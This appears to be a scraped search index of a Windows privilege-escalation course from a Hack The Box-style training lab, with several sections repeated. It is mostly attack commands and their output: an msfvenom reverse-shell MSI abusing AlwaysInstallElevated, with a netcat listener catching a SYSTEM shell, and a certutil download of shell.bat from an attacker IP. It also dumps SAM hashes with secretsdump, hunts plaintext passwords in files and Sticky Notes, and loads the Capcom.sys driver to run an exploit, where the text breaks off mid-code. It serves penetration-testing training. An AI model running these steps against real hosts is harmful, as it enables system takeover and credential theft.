\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319 Next Run Time: N/A Status: Ready Logon Mode: Interactive/Background Last Run Time: 5/27/2021 12:23:27 PM Last Result: 0 Author: N/A Task To Run: COM handler Start In: N/A Comment: N/A Scheduled Task State: Enabled Idle Time: Disabled Power Management: Stop On Battery Mode, No Start On Batteries Run As User: SYSTEM Delete Task If Not Rescheduled: Disabled Stop Task If Runs X Hours and X Mins: 02:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: On demand only Start Time: N/A Start Date: N/A End Date: N/A Days: N/A Months: N/A Repeat: Every: N/A Repeat: Until: Time: N/A Repeat: Until: Duration: N/A Repeat: Stop If Still Running: N/A <SNIP> PowerShell cmdlet for this: PS C :\\ htb > Get-ScheduledTask | select TaskName , State TaskName State -------- ----- . NET Framework NGEN v4 . 0 . 30319 Ready . NET Framework NGEN v4 . 0 . 30319 64 Ready . NET Framework NGEN v4 . 0 . 30319 64 Critical Disabled . NET Framework NGEN v4 . 0 . 30319 Critical Disabled AD RMS Rights Policy Template Management ( Automated ) Disabled AD RMS Rights Policy Template Management ( Manual ) Ready PolicyConverter Disabled SmartScreenSpecific Ready VerifiedPublisherCertStoreCheck Disabled Microsoft Compatibility Appraiser Ready ProgramDataUpdater Ready StartupAppTask Ready appuriverifierdaily Ready appuriverifierinstall Ready CleanupTemporaryState Ready DsSvcCleanup Ready Pre-staged app cleanup Disabled < SNIP > By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in C:\\Windows\\System32\\Tasks , which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task. Checking Permissions on C:\\Scripts Directory C:\\htb> .\\accesschk64.exe /accepteula -s -d C:\\Scripts\\ Accesschk v6.13 - Reports effective permissions for securable objects Copyright \u2310 2006-2020 Mark Russinovich Sysinternals - www.sysinternals.com C:\\Scripts RW BUILTIN\\Users RW NT AUTHORITY\\SYSTEM RW BUILTIN\\Administrators Checking Local User Description Field \u00b6 PS C :\\ htb > Get-LocalUser Name Enabled Description ---- ------- ----------- Administrator True Built-in account for administering the computer / domain DefaultAccount False A user account managed by the system . Guest False Built-in account for guest access to the computer / domain helpdesk True htb-student True htb-student_adm True jordan True logger True sarah True sccm_svc True secsvc True Network scanner - do not change password sql_dev True Enumerating Computer Description Field with Get-WmiObject Cmdlet \u00b6 PS C :\\ htb > Get-WmiObject -Class Win32_OperatingSystem | select Description Description ----------- The most vulnerable box ever ! Mount VHDX/VMDK \u00b6 Snaffler file types of interest are .vhd , .vhdx , and .vmdk files. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands. Mount VMDK on Linux hrmns@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk Mount VHD/VHDX on Linux hrmns@htb[/htb]$ guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1 In Windows, we can right-click on the file and choose Mount, or use the Disk Management utility to mount a .vhd or .vhdx file. If preferred, we can use the Mount-VHD PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse. For a .vmdk file, we can right-click and choose Map Virtual Disk from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation File \u2192 Map Virtual Disks to map the disk onto our base system. We could also add the .vmdk file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use 7-Zip to extract data from a .vmdk file. This guide illustrates many methods for gaining access to the files on a .vmdk file. Retrieving Hashes using Secretsdump.py \u00b6 Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the C:\\Windows\\System32\\Config directory and pull down the SAM , SECURITY and SYSTEM registry hives. We can then use a tool such as secretsdump to extract the password hashes for local users. hrmns@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) <SNIP>","title":"Miscellaneous Techniques"},{"location":"windows_privesc/miscellaneous_techniques/#transferring-file-with-certutil","text":"certutil.exe intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file. PS C :\\ htb > certutil . exe -urlcache -split -f http :// 10 . 10 . 14 . 3 : 8080 / shell . bat shell . bat We can use the -encode flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system. C:\\htb> certutil -encode file1 encodedfile Input Length = 7 Output Length = 70 CertUtil: -encode command completed successfully Once the new file has been created, we can use the -decode flag to decode the file back to its original contents. C:\\htb> certutil -decode encodedfile file2 Input Length = 70 Output Length = 7 CertUtil: -decode command completed successfully.","title":"Transferring File with Certutil"},{"location":"windows_privesc/miscellaneous_techniques/#always-install-elevated","text":"This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths Computer Configuration\\Administrative Templates\\Windows Components\\Windows Installer User Configuration\\Administrative Templates\\Windows Components\\Windows Installer Enumerating Always Install Elevated Settings PS C :\\ htb > reg query HKEY_CURRENT_USER \\ Software \\ Policies \\ Microsoft \\ Windows \\ Installer HKEY_CURRENT_USER \\ Software \\ Policies \\ Microsoft \\ Windows \\ Installer AlwaysInstallElevated REG_DWORD 0x1 PS C :\\ htb > reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer AlwaysInstallElevated REG_DWORD 0x1 AlwaysInstallElevated key exists, so the policy is indeed enabled on the target system. We can exploit this by generating a malicious MSI package and execute it via the command line to obtain a reverse shell with SYSTEM privileges. hrmns@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost = 10 .10.14.3 lport = 9443 -f msi > aie.msi [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of msi file: 159744 bytes upload this MSI file to our target, start a Netcat listener and execute the file C:\\htb> msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart we will receive a connection back as NT AUTHORITY\\SYSTEM hrmns@htb[/htb]$ nc -lnvp 9443 listening on [any] 9443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720 Microsoft Windows [Version 10.0.18363.592] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system This issue can be mitigated by disabling the two Local Group Policy settings mentioned above.","title":"Always Install Elevated"},{"location":"windows_privesc/miscellaneous_techniques/#enumerating-scheduled-tasks","text":"We can use the schtasks command to enumerate scheduled tasks on the system. C:\\htb> schtasks /query /fo LIST /v Folder: \\ INFO: There are no scheduled tasks presently available at your access level. Folder: \\Microsoft INFO: There are no scheduled tasks presently available at your access level. Folder: \\Microsoft\\Windows INFO: There are no scheduled tasks presently available at your access level. Folder: \\Microsoft\\Windows\\.NET Framework HostName: WINLPE-SRV01 TaskName: \\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319 Next Run Time: N/A Status: Ready Logon Mode: Interactive/Background Last Run Time: 5/27/2021 12:23:27 PM Last Result: 0 Author: N/A Task To Run: COM handler Start In: N/A Comment: N/A Scheduled Task State: Enabled Idle Time: Disabled Power Management: Stop On Battery Mode, No Start On Batteries Run As User: SYSTEM Delete Task If Not Rescheduled: Disabled Stop Task If Runs X Hours and X Mins: 02:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: On demand only Start Time: N/A Start Date: N/A End Date: N/A Days: N/A Months: N/A Repeat: Every: N/A Repeat: Until: Time: N/A Repeat: Until: Duration: N/A Repeat: Stop If Still Running: N/A <SNIP> PowerShell cmdlet for this: PS C :\\ htb > Get-ScheduledTask | select TaskName , State TaskName State -------- ----- . NET Framework NGEN v4 . 0 . 30319 Ready . NET Framework NGEN v4 . 0 . 30319 64 Ready . NET Framework NGEN v4 . 0 . 30319 64 Critical Disabled . NET Framework NGEN v4 . 0 . 30319 Critical Disabled AD RMS Rights Policy Template Management ( Automated ) Disabled AD RMS Rights Policy Template Management ( Manual ) Ready PolicyConverter Disabled SmartScreenSpecific Ready VerifiedPublisherCertStoreCheck Disabled Microsoft Compatibility Appraiser Ready ProgramDataUpdater Ready StartupAppTask Ready appuriverifierdaily Ready appuriverifierinstall Ready CleanupTemporaryState Ready DsSvcCleanup Ready Pre-staged app cleanup Disabled < SNIP > By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in C:\\Windows\\System32\\Tasks , which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task. Checking Permissions on C:\\Scripts Directory C:\\htb> .\\accesschk64.exe /accepteula -s -d C:\\Scripts\\ Accesschk v6.13 - Reports effective permissions for securable objects Copyright \u2310 2006-2020 Mark Russinovich Sysinternals - www.sysinternals.com C:\\Scripts RW BUILTIN\\Users RW NT AUTHORITY\\SYSTEM RW BUILTIN\\Administrators","title":"Enumerating Scheduled Tasks"},{"location":"windows_privesc/miscellaneous_techniques/#checking-local-user-description-field","text":"PS C :\\ htb > Get-LocalUser Name Enabled Description ---- ------- ----------- Administrator True Built-in account for administering the computer / domain DefaultAccount False A user account managed by the system . Guest False Built-in account for guest access to the computer / domain helpdesk True htb-student True htb-student_adm True jordan True logger True sarah True sccm_svc True secsvc True Network scanner - do not change password sql_dev True","title":"Checking Local User Description Field"},{"location":"windows_privesc/miscellaneous_techniques/#enumerating-computer-description-field-with-get-wmiobject-cmdlet","text":"PS C :\\ htb > Get-WmiObject -Class Win32_OperatingSystem | select Description Description ----------- The most vulnerable box ever !","title":"Enumerating Computer Description Field with Get-WmiObject Cmdlet"},{"location":"windows_privesc/miscellaneous_techniques/#mount-vhdxvmdk","text":"Snaffler file types of interest are .vhd , .vhdx , and .vmdk files. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands. Mount VMDK on Linux hrmns@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk Mount VHD/VHDX on Linux hrmns@htb[/htb]$ guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1 In Windows, we can right-click on the file and choose Mount, or use the Disk Management utility to mount a .vhd or .vhdx file. If preferred, we can use the Mount-VHD PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse. For a .vmdk file, we can right-click and choose Map Virtual Disk from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation File \u2192 Map Virtual Disks to map the disk onto our base system. We could also add the .vmdk file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use 7-Zip to extract data from a .vmdk file. This guide illustrates many methods for gaining access to the files on a .vmdk file.","title":"Mount VHDX/VMDK"},{"location":"windows_privesc/miscellaneous_techniques/#retrieving-hashes-using-secretsdumppy","text":"Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the C:\\Windows\\System32\\Config directory and pull down the SAM , SECURITY and SYSTEM registry hives. We can then use a tool such as secretsdump to extract the password hashes for local users. hrmns@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) <SNIP>","title":"Retrieving Hashes using Secretsdump.py"},{"location":"windows_privesc/other_files/","text":"There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as Snaffler to crawl network share drives for interesting file extensions. Cheatsheet Search File Contents for String - Example 1 \u00b6 C:\\htb> cd c:\\Users\\htb-student\\Documents & findstr /SI /M \"password\" *.xml *.ini *.txt stuff.txt Search File Contents for String - Example 2 \u00b6 C:\\htb> findstr /si password *.xml *.ini *.txt *.config stuff.txt:password: l# -x9r11_2_GL! Search File Contents for String - Example 3 \u00b6 C:\\htb> findstr /spin \"password\" *.* stuff.txt:1:password: l# -x9r11_2_GL! Search File Contents with PowerShell \u00b6 PS C:\\htb> select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password stuff.txt:1:password: l#-x9r11_2_GL! Search for File Extensions - Example 1 \u00b6 C:\\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* c:\\inetpub\\wwwroot\\web.config Search for File Extensions - Example 1 \u00b6 C:\\htb> where /R C:\\ *.config c:\\inetpub\\wwwroot\\web.config Search for File Extensions Using PowerShell \u00b6 PS C :\\ htb > Get-ChildItem C :\\ -Recurse -Include *. rdp , *. config , *. vnc , *. cred -ErrorAction Ignore Directory : C :\\ inetpub \\ wwwroot Mode LastWriteTime Length Name ---- ------------- ------ ---- -a ---- 5 / 25 / 2021 9 : 59 AM 329 web . config < SNIP > Sticky Notes Passwords \u00b6 People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite and is always worth searching for and examining. PS C :\\ htb > ls Directory : C :\\ Users \\ htb-student \\ AppData \\ Local \\ Packages \\ Microsoft . MicrosoftStickyNotes_8wekyb3d8bbwe \\ LocalState Mode LastWriteTime Length Name ---- ------------- ------ ---- -a ---- 5 / 25 / 2021 11 : 59 AM 20480 15cbbc93e90a4d56bf8d9a29305b8981 . storage . session -a ---- 5 / 25 / 2021 11 : 59 AM 982 Ecs . dat -a ---- 5 / 25 / 2021 11 : 59 AM 4096 plum . sqlite -a ---- 5 / 25 / 2021 11 : 59 AM 32768 plum . sqlite-shm -a ---- 5 / 25 / 2021 12 : 00 PM 197792 plum . sqlite-wal Viewing Sticky Notes Data Using PowerShell: PSSQLite module PS C :\\ htb > Set-ExecutionPolicy Bypass -Scope Process Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at https :/ go . microsoft . com / fwlink / ? LinkID = 135170 . Do you want to change the execution policy ? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help ( default is \"N\" ): A PS C :\\ htb > cd .\\ PSSQLite \\ PS C :\\ htb > Import-Module .\\ PSSQLite . psd1 PS C :\\ htb > $db = 'C:\\Users\\htb-student\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite' PS C :\\ htb > Invoke-SqliteQuery -Database $db -Query \"SELECT Text FROM Note\" | ft -wrap Text ---- \\ id = de368df0 - 6939 - 4579 - 8d38 - 0fda521c9bc4 vCenter \\ id = e4adae4c-a40b - 48b4 - 93a5 - 900247852f96 \\ id = 1a44a631 - 6fff - 4961-a4df - 27898e9e1e65 root : Vc3nt3R_adm1n ! \\ id = c450fc5f-dc51 - 4412-b4ac - 321fd41c522a Thycotic demo tomorrow at 10am Strings to View DB File Contents \u00b6 We can also copy them over to our attack box and search through the data using the strings command, which may be less efficient depending on the size of the database. hrmns@htb[/htb]$ strings plum.sqlite-wal CREATE TABLE \"Note\" ( \"Text\" varchar , \"WindowPosition\" varchar , \"IsOpen\" integer , \"IsAlwaysOnTop\" integer , \"CreationNoteIdAnchor\" varchar , \"Theme\" varchar , \"IsFutureNote\" integer , \"RemoteId\" varchar , \"ChangeKey\" varchar , \"LastServerVersion\" varchar , \"RemoteSchemaVersion\" integer , \"IsRemoteDataInvalid\" integer , \"PendingInsightsScan\" integer , \"Type\" varchar , \"Id\" varchar primary key not null , \"ParentId\" varchar , \"CreatedAt\" bigint , \"DeletedAt\" bigint , \"UpdatedAt\" bigint )' indexsqlite_autoindex_Note_1Note af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c U af907b1b-1eef-4d29-b238-3ea74f7ffe5c Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c U 93b49900-6530-42e0-b35c-2663989ae4b3 < SNIP > \\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter \\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright* \\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c <SNIP > Other Files of Interest \u00b6 % SYSTEMDRIVE% \\p agefile.sys % WINDIR% \\d ebug \\N etSetup.log % WINDIR% \\r epair \\s am % WINDIR% \\r epair \\s ystem % WINDIR% \\r epair \\s oftware, %WINDIR% \\r epair \\s ecurity % WINDIR% \\i is6.log % WINDIR% \\s ystem32 \\c onfig \\A ppEvent.Evt % WINDIR% \\s ystem32 \\c onfig \\S ecEvent.Evt % WINDIR% \\s ystem32 \\c onfig \\d efault.sav % WINDIR% \\s ystem32 \\c onfig \\s ecurity.sav % WINDIR% \\s ystem32 \\c onfig \\s oftware.sav % WINDIR% \\s ystem32 \\c onfig \\s ystem.sav % WINDIR% \\s ystem32 \\C CM \\l ogs \\* .log % USERPROFILE% \\n tuser.dat % USERPROFILE% \\L ocalS~1 \\T empor~1 \\C ontent.IE5 \\i ndex.dat % WINDIR% \\S ystem32 \\d rivers \\e tc \\h osts C:\\ProgramData\\Configs\\* C:\\Program Files\\Windows PowerShell\\*","title":"Other Files"},{"location":"windows_privesc/other_files/#search-file-contents-for-string-example-1","text":"C:\\htb> cd c:\\Users\\htb-student\\Documents & findstr /SI /M \"password\" *.xml *.ini *.txt stuff.txt","title":"Search File Contents for String - Example 1"},{"location":"windows_privesc/other_files/#search-file-contents-for-string-example-2","text":"C:\\htb> findstr /si password *.xml *.ini *.txt *.config stuff.txt:password: l# -x9r11_2_GL!","title":"Search File Contents for String - Example 2"},{"location":"windows_privesc/other_files/#search-file-contents-for-string-example-3","text":"C:\\htb> findstr /spin \"password\" *.* stuff.txt:1:password: l# -x9r11_2_GL!","title":"Search File Contents for String - Example 3"},{"location":"windows_privesc/other_files/#search-file-contents-with-powershell","text":"PS C:\\htb> select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password stuff.txt:1:password: l#-x9r11_2_GL!","title":"Search File Contents with PowerShell"},{"location":"windows_privesc/other_files/#search-for-file-extensions-example-1","text":"C:\\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* c:\\inetpub\\wwwroot\\web.config","title":"Search for File Extensions - Example 1"},{"location":"windows_privesc/other_files/#search-for-file-extensions-example-1_1","text":"C:\\htb> where /R C:\\ *.config c:\\inetpub\\wwwroot\\web.config","title":"Search for File Extensions - Example 1"},{"location":"windows_privesc/other_files/#search-for-file-extensions-using-powershell","text":"PS C :\\ htb > Get-ChildItem C :\\ -Recurse -Include *. rdp , *. config , *. vnc , *. cred -ErrorAction Ignore Directory : C :\\ inetpub \\ wwwroot Mode LastWriteTime Length Name ---- ------------- ------ ---- -a ---- 5 / 25 / 2021 9 : 59 AM 329 web . config < SNIP >","title":"Search for File Extensions Using PowerShell"},{"location":"windows_privesc/other_files/#sticky-notes-passwords","text":"People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite and is always worth searching for and examining. PS C :\\ htb > ls Directory : C :\\ Users \\ htb-student \\ AppData \\ Local \\ Packages \\ Microsoft . MicrosoftStickyNotes_8wekyb3d8bbwe \\ LocalState Mode LastWriteTime Length Name ---- ------------- ------ ---- -a ---- 5 / 25 / 2021 11 : 59 AM 20480 15cbbc93e90a4d56bf8d9a29305b8981 . storage . session -a ---- 5 / 25 / 2021 11 : 59 AM 982 Ecs . dat -a ---- 5 / 25 / 2021 11 : 59 AM 4096 plum . sqlite -a ---- 5 / 25 / 2021 11 : 59 AM 32768 plum . sqlite-shm -a ---- 5 / 25 / 2021 12 : 00 PM 197792 plum . sqlite-wal Viewing Sticky Notes Data Using PowerShell: PSSQLite module PS C :\\ htb > Set-ExecutionPolicy Bypass -Scope Process Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at https :/ go . microsoft . com / fwlink / ? LinkID = 135170 . Do you want to change the execution policy ? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help ( default is \"N\" ): A PS C :\\ htb > cd .\\ PSSQLite \\ PS C :\\ htb > Import-Module .\\ PSSQLite . psd1 PS C :\\ htb > $db = 'C:\\Users\\htb-student\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite' PS C :\\ htb > Invoke-SqliteQuery -Database $db -Query \"SELECT Text FROM Note\" | ft -wrap Text ---- \\ id = de368df0 - 6939 - 4579 - 8d38 - 0fda521c9bc4 vCenter \\ id = e4adae4c-a40b - 48b4 - 93a5 - 900247852f96 \\ id = 1a44a631 - 6fff - 4961-a4df - 27898e9e1e65 root : Vc3nt3R_adm1n ! \\ id = c450fc5f-dc51 - 4412-b4ac - 321fd41c522a Thycotic demo tomorrow at 10am","title":"Sticky Notes Passwords"},{"location":"windows_privesc/other_files/#strings-to-view-db-file-contents","text":"We can also copy them over to our attack box and search through the data using the strings command, which may be less efficient depending on the size of the database. hrmns@htb[/htb]$ strings plum.sqlite-wal CREATE TABLE \"Note\" ( \"Text\" varchar , \"WindowPosition\" varchar , \"IsOpen\" integer , \"IsAlwaysOnTop\" integer , \"CreationNoteIdAnchor\" varchar , \"Theme\" varchar , \"IsFutureNote\" integer , \"RemoteId\" varchar , \"ChangeKey\" varchar , \"LastServerVersion\" varchar , \"RemoteSchemaVersion\" integer , \"IsRemoteDataInvalid\" integer , \"PendingInsightsScan\" integer , \"Type\" varchar , \"Id\" varchar primary key not null , \"ParentId\" varchar , \"CreatedAt\" bigint , \"DeletedAt\" bigint , \"UpdatedAt\" bigint )' indexsqlite_autoindex_Note_1Note af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c U af907b1b-1eef-4d29-b238-3ea74f7ffe5c Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c U 93b49900-6530-42e0-b35c-2663989ae4b3 < SNIP > \\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter \\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright* \\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c <SNIP >","title":"Strings to View DB File Contents"},{"location":"windows_privesc/other_files/#other-files-of-interest","text":"% SYSTEMDRIVE% \\p agefile.sys % WINDIR% \\d ebug \\N etSetup.log % WINDIR% \\r epair \\s am % WINDIR% \\r epair \\s ystem % WINDIR% \\r epair \\s oftware, %WINDIR% \\r epair \\s ecurity % WINDIR% \\i is6.log % WINDIR% \\s ystem32 \\c onfig \\A ppEvent.Evt % WINDIR% \\s ystem32 \\c onfig \\S ecEvent.Evt % WINDIR% \\s ystem32 \\c onfig \\d efault.sav % WINDIR% \\s ystem32 \\c onfig \\s ecurity.sav % WINDIR% \\s ystem32 \\c onfig \\s oftware.sav % WINDIR% \\s ystem32 \\c onfig \\s ystem.sav % WINDIR% \\s ystem32 \\C CM \\l ogs \\* .log % USERPROFILE% \\n tuser.dat % USERPROFILE% \\L ocalS~1 \\T empor~1 \\C ontent.IE5 \\i ndex.dat % WINDIR% \\S ystem32 \\d rivers \\e tc \\h osts C:\\ProgramData\\Configs\\* C:\\Program Files\\Windows PowerShell\\*","title":"Other Files of Interest"},{"location":"windows_privesc/print_operators/","text":"Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command whoami /priv, and don't see the SeLoadDriverPrivilege from an unelevated context, we will need to bypass UAC. C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ======================== ================================= ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeShutdownPrivilege Shut down the system Disabled The UACMe repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, SeLoadDriverPrivilege is visible but disabled. C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ================================== ========== SeMachineAccountPrivilege Add workstations to domain Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled The driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use this tool to load the driver. The PoC enables the privilege as well as loads the driver for us. Download it locally and edit it, pasting over the includes below. #include <windows.h> #include <assert.h> #include <winternl.h> #include <sddl.h> #include <stdio.h> #include \"tchar.h\" From a Visual Studio 2019 Developer Command Prompt, compile it using cl.exe. C:\\Users\\>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86 Copyright (C) Microsoft Corporation. All rights reserved. EnableSeLoadDriverPrivilege.cpp Microsoft (R) Incremental Linker Version 14.28.29913.0 Copyright (C) Microsoft Corporation. All rights reserved. /out:EnableSeLoadDriverPrivilege.exe EnableSeLoadDriverPrivilege.obj Download the Capcom.sys driver from here , and save it to C:\\temp . Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree. C:\\htb> reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\" The operation completed successfully. C:\\htb> reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1 The operation completed successfully. Using Nirsoft's DriverView.exe , we can verify that the Capcom.sys driver is not loaded. PS C:\\htb> .\\DriverView.exe /stext drivers.txt PS C:\\htb> cat drivers.txt | Select-String -pattern Capcom Run the EnableSeLoadDriverPrivilege.exe binary. C:\\htb> EnableSeLoadDriverPrivilege.exe whoami: INLANEFREIGHT0\\printsvc whoami /priv SeMachineAccountPrivilege Disabled SeLoadDriverPrivilege Enabled SeShutdownPrivilege Disabled SeChangeNotifyPrivilege Enabled by default SeIncreaseWorkingSetPrivilege Disabled NTSTATUS: 00000000, WinError: 0 Verify that the Capcom driver is now listed. PS C:\\htb> .\\DriverView.exe /stext drivers.txt PS C:\\htb> cat drivers.txt | Select-String -pattern Capcom Driver Name : Capcom.sys Filename : C:\\Tools\\Capcom.sys To exploit the Capcom.sys, we can use the ExploitCapcom tool after compiling with it Visual Studio. PS C:\\htb> .\\ExploitCapcom.exe [*] Capcom.sys exploit [*] Capcom.sys handle was obained as 0000000000000070 [*] Shellcode was placed at 0000024822A50008 [+] Shellcode was executed [+] Token stealing was successful [+] The SYSTEM shell was launched This launches a shell with SYSTEM privileges. If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace C:\\\\Windows\\\\system32\\\\cmd.exe with, say, a reverse shell binary created with msfvenom , for example: c:\\ProgramData\\revshell.exe . // Launches a command shell process static bool LaunchShell () { TCHAR CommandLine [] = TEXT ( \"C: \\\\ Windows \\\\ system32 \\\\ cmd.exe\" ); PROCESS_INFORMATION ProcessInfo 